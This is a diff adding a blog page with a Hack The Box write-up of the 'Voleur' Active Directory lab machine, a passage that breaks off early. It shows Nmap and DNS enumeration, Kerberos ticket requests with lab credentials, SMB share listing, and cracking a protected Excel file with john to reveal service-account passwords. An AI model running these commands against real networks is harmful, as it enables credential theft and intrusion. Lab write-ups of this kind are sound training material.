@@ -1,0 +1,851 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
+
+  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b">
+
+<style>
+  :root {
+    font-size: 20px;
+  }
+</style>
+  <title>HTB Machine — Voleur&nbsp;|&nbsp;C:\Users\ch3ng &gt;_</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="HTB Machine — Voleur">
+  
+    <meta name="description" content="Voleur translates to “thief” in French, which is a fitting name for this box as it’s all about “stealing” information and secrets everywhere. It starts with finding an Excel file in SMB containing credentials for several users, one of which has permissions to restore a deleted user account. That account has access to a home directory backup containing DPAPI credentials, which kicks off a chain of lateral movement and pillaging, eventually leading to recovering an ntds.dit backup and dumping the admin hash.">
+    <meta property="og:description" content="Voleur translates to “thief” in French, which is a fitting name for this box as it’s all about “stealing” information and secrets everywhere. It starts with finding an Excel file in SMB containing credentials for several users, one of which has permissions to restore a deleted user account. That account has access to a home directory backup containing DPAPI credentials, which kicks off a chain of lateral movement and pillaging, eventually leading to recovering an ntds.dit backup and dumping the admin hash.">
+  
+  
+    <meta property="og:image" content="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/635619778e50cc8f69df91cc6ae149c4.png">
+  
+  <style>
+    .DateTagBar {
+      margin-top: 1.0rem;
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="Navbar">
+  <a href="/">
+    <div class="Navbar__Btn">
+      
+        <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b"></span>&nbsp;
+      
+      <span>Home</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://github.com/ch3ng625", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/github.svg"></span>&nbsp;
+      <span>GitHub</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://au.linkedin.com/in/chengw625/", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/linkedin.png"></span>&nbsp;
+      <span>LinkedIn</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://app.hackthebox.com/profile/786447", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/htb.svg"></span>&nbsp;
+      <span>HackTheBox</span>
+    </div>
+  </a>
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+</nav>
+
+  <header class="Header">
+    
+    <div class="Header__Spacer Header__Spacer--NoCover">
+    </div>
+    
+      <div class="Header__Icon">
+        <span><img class="inline-img-icon" src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/635619778e50cc8f69df91cc6ae149c4.png"></span>
+      </div>
+    
+    <h1 class="Header__Title">HTB Machine — Voleur</h1>
+    
+      <div class="DateTagBar">
+        
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Sun, Nov 2, 2025</span>
+        
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
+            <a href="tag/HTB">HTB</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--pink">
+            <a href="tag/Windows">Windows</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--yellow">
+            <a href="tag/Medium">Medium</a>
+          </span>
+        
+      </div>
+    
+  </header>
+  <article id="https://www.notion.so/24e0b98a88f780a880d3fcddc648f2a5" class="PageRoot"><h2 id="https://www.notion.so/24e0b98a88f7818d90bae96e499568f9" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/24e0b98a88f7818d90bae96e499568f9"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Summary:</span></span></h2><div id="https://www.notion.so/29e0b98a88f780898eacf6fa796a12b8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">Voleur</em></span><span class="SemanticString"> translates to “thief” in French, which is a fitting name for this box as it’s all about “stealing” information and secrets everywhere. It starts with finding an Excel file in SMB containing credentials for several users, one of which has permissions to restore a deleted user account. That account has access to a home directory backup containing DPAPI credentials, which kicks off a chain of lateral movement and pillaging, eventually leading to recovering an </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ntds.dit</code></span><span class="SemanticString"> backup and dumping the admin hash.</span></span></p></div><div id="https://www.notion.so/24e0b98a88f781f39873de8319dd07b9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/24e0b98a88f78110b53cdc2b6496c647" class="Divider"></div><h2 id="https://www.notion.so/24e0b98a88f78182bc44c6f188d30efa" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/24e0b98a88f78182bc44c6f188d30efa"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration:</span></span></h2><h3 id="https://www.notion.so/24e0b98a88f780248c61c33f53e59ece" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/24e0b98a88f780248c61c33f53e59ece"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Nmap:</span></span></h3><div id="https://www.notion.so/29d0b98a88f780d792f4fb9092032ecf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">As common with recent AD machines, it is an assumed breach scenario with a set of domain credentials provided from the start: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ryan.naylor:HollowOct31Nyt</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/29d0b98a88f780b5b371d5e094128965" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Regardless, like any other boxes, it starts with Nmap scans:</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f780a6a297e627c6ebf2d7" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap --min-rate 1000 -p- 10.129.232.130    
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 23:03 ACST
+Nmap scan report for 10.129.232.130
+Host is up (0.26s latency).
+Not shown: 65514 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+2222/tcp  open  EtherNetIP-1
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49664/tcp open  unknown
+49668/tcp open  unknown
+49672/tcp open  unknown
+53400/tcp open  unknown
+53401/tcp open  unknown
+53404/tcp open  unknown
+53426/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 263.73 seconds
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap -A -p 53,88,135,139,389,445,464,593,636,2222,3268,3269,5985,9389,49664,49668,49672,53400,53401,53404,53426 10.129.232.130
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 23:16 ACST
+Nmap scan report for 10.129.232.130
+Host is up (0.25s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-28 21:46:11Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
+|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
+|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49672/tcp open  msrpc         Microsoft Windows RPC
+53400/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+53401/tcp open  msrpc         Microsoft Windows RPC
+53404/tcp open  msrpc         Microsoft Windows RPC
+53426/tcp open  msrpc         Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2022 (88%)
+OS CPE: cpe:/o:microsoft:windows_server_2022
+Aggressive OS guesses: Microsoft Windows Server 2022 (88%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2025-07-28T21:47:15
+|_  start_date: N/A
+|_clock-skew: 8h00m00s
+
+TRACEROUTE (using port 53/tcp)
+HOP RTT       ADDRESS
+1   257.56 ms 10.10.14.1
+2   258.47 ms 10.129.232.130
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 118.58 seconds</span></span></span></code></pre><div id="https://www.notion.so/29e0b98a88f780619f19e5b0ef7d04bb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Nmap found all the common services you’d expect on a domain controller, with DNS, Kerberos, SMB and LDAP all running. Interestingly, the LDAP scan returned very little data, only revealing the domain name </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">voleur.htb</code></span><span class="SemanticString">. The machine name, which is important when dealing with Kerberos, is not shown here, and has to be dug out from DNS separately:</span></span></p></div><pre id="https://www.notion.so/29e0b98a88f780a281afebcf7f58302e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> dig any voleur.htb @10.129.10.190
+
+; &lt;&lt;&gt;&gt; DiG 9.20.9-1-Debian &lt;&lt;&gt;&gt; any voleur.htb @10.129.10.190
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 6517
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4000
+;; QUESTION SECTION:
+;voleur.htb.			IN	ANY
+
+;; ANSWER SECTION:
+voleur.htb.		600	IN	A	10.129.232.130
+voleur.htb.		3600	IN	NS	dc.voleur.htb.
+voleur.htb.		3600	IN	SOA	dc.voleur.htb. hostmaster.voleur.htb. 173 900 600 86400 3600
+
+;; ADDITIONAL SECTION:
+dc.voleur.htb.		3600	IN	A	10.129.232.130
+
+;; Query time: 259 msec
+;; SERVER: 10.129.10.190#53(10.129.10.190) (TCP)
+;; WHEN: Mon Jul 28 23:44:50 ACST 2025
+;; MSG SIZE  rcvd: 135</span></span></span></code></pre><div id="https://www.notion.so/29e0b98a88f78058850acd636a925244" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll add all of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">voleur.htb</code></span><span class="SemanticString">, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">dc.voleur.htb</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">dc</code></span><span class="SemanticString"> to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/hosts</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/29d0b98a88f780399029c30baf5db3cc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s also SSH running on port 2222. It shows a Ubuntu banner, so it might be running within a Linux VM/container. I immediately tried logging in with the provided creds, but it only allows key authentication.</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f7802286a9ef0e180c84ad" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> ssh ryan.naylor@voleur.htb -p 2222
+
+Warning: Permanently added &#x27;[voleur.htb]:2222&#x27; (ED25519) to the list of known hosts.
+ryan.naylor@voleur.htb: Permission denied (publickey).</span></span></span></code></pre><h3 id="https://www.notion.so/24e0b98a88f78005aa0bfff6f2a12f9f" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/24e0b98a88f78005aa0bfff6f2a12f9f"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">TCP445 — SMB:</span></span></h3><div id="https://www.notion.so/29e0b98a88f78025921df2e29ec422a4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">NTLM authentication is disabled, so I’ll have to use a TGT instead.</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f780318ba3f35c6d637acc" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> impacket-getTGT -dc-ip 10.129.10.190 &#x27;voleur.htb/ryan.naylor:HollowOct31Nyt&#x27;
+
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in ryan.naylor.ccache
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> KRB5CCNAME=ryan.naylor.ccache netexec smb dc.voleur.htb -d &#x27;voleur.htb&#x27; -k --use-kcache --shares
+
+SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor from ccache 
+SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
+SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
+SMB         dc.voleur.htb   445    dc               -----           -----------     ------
+SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
+SMB         dc.voleur.htb   445    dc               C$                              Default share
+SMB         dc.voleur.htb   445    dc               Finance                         
+SMB         dc.voleur.htb   445    dc               HR                              
+SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
+SMB         dc.voleur.htb   445    dc               IT              READ            
+SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
+SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share</span></span></span></code></pre><div id="https://www.notion.so/24e0b98a88f780e194bde7f47ed7d6a5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s 3 interesting shares: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Finance</code></span><span class="SemanticString">, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">HR</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">IT</code></span><span class="SemanticString">. Only </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">IT</code></span><span class="SemanticString"> is readable.</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f780dcbe26f11ea600fb4a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> impacket-smbclient -k -dc-ip 10.129.10.190 &#x27;dc.voleur.htb&#x27;
+
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# use IT
+# ls
+drw-rw-rw-          0  Wed Jan 29 19:40:01 2025 .
+drw-rw-rw-          0  Fri Jul 25 05:39:59 2025 ..
+drw-rw-rw-          0  Wed Jan 29 20:10:17 2025 First-Line Support</span></span></span></code></pre><div id="https://www.notion.so/29e0b98a88f780ab8462d7d8952c2924" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The share has a single folder </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">First-Line Support</code></span><span class="SemanticString">, which contains an Excel file.</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f7805e998bde1caef90829" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span># cd First-Line Support
+# ls
+drw-rw-rw-          0  Wed Jan 29 20:10:17 2025 .
+drw-rw-rw-          0  Wed Jan 29 19:40:01 2025 ..
+-rw-rw-rw-      16896  Fri May 30 07:53:36 2025 Access_Review.xlsx</span></span></span></code></pre><div id="https://www.notion.so/29e0b98a88f78008912ac24df436a389" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I downloaded the Excel file and attempted to open it, but it’s password-protected:</span></span></p></div><div id="https://www.notion.so/29e0b98a88f7804c8584cd9ea2d37a59" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/voleur/excel_password_protected.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/voleur/excel_password_protected.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/29e0b98a88f7802cba50c1deb64d144d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">When it comes to cracking passwords, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">john</code></span><span class="SemanticString"> has a module for almost everything, and Excels are no different. I’ll use </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">office2john</code></span><span class="SemanticString"> to convert the Excel file into a hash for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">john</code></span><span class="SemanticString"> to crack:</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f780b8abc6fbf4e839228c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> office2john Access_Review.xlsx &gt; excel.hash
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> john --wordlist=/usr/share/wordlists/rockyou.txt excel.hash 
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
+Cost 1 (MS Office version) is 2013 for all loaded hashes
+Cost 2 (iteration count) is 100000 for all loaded hashes
+Will run 16 OpenMP threads
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>football1        (Access_Review.xlsx)</span></mark></span><span class="SemanticString"><span>     
+1g 0:00:00:01 DONE (2025-07-29 00:27) 0.7142g/s 640.0p/s 640.0c/s 640.0C/s football1..ilovegod
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.</span></span></span></code></pre><div id="https://www.notion.so/24e0b98a88f780a1ad19da1e1fd0df55" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Within seconds, the hash is cracked to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">football1</code></span><span class="SemanticString">, and can be used to open the file:</span></span></p></div><div id="https://www.notion.so/29e0b98a88f780ee8846db9f5d0e6eff" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/voleur/excel_content.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/voleur/excel_content.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/29e0b98a88f780faa30bf48829b101ce" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It contains notes for several users, as well as plaintext passwords for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">svc_ldap</code></span><span class="SemanticString">, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">svc_iis</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">todd.wolfe</code></span><span class="SemanticString">. On first look, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">jeremy.combs</code></span><span class="SemanticString"> appears to be a high value target. It has access to the Software folder, control over the backup account, as well as being in the WinRM group.</span></span></p></div><div id="https://www.notion.so/29e0b98a88f780e18062fb4514733487" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The note also mentioned that </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">todd.wolfe</code></span><span class="SemanticString"> has been deleted, but this is likely not permanent. By default, deleting a user in AD moves the account to the Deleted Objects container (i.e. AD Tombstone) and sets its </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">isDeleted</code></span><span class="SemanticString"> attribute to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">True</code></span><span class="SemanticString">. It remains there until the tombstone lifetime (180 days by default) expires, after which it’s permanently removed. It’s worth checking if those service accounts can restore deleted objects, as this privilege, along with Todd’s password found in the Excel, provides another path for lateral movement or potentially escalation.</span></span></p></div><h3 id="https://www.notion.so/24e0b98a88f780538202efa2ae90067a" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/24e0b98a88f780538202efa2ae90067a"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">BloodHound:</span></span></h3><div id="https://www.notion.so/29e0b98a88f78053ae21e44e538e0b9f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span 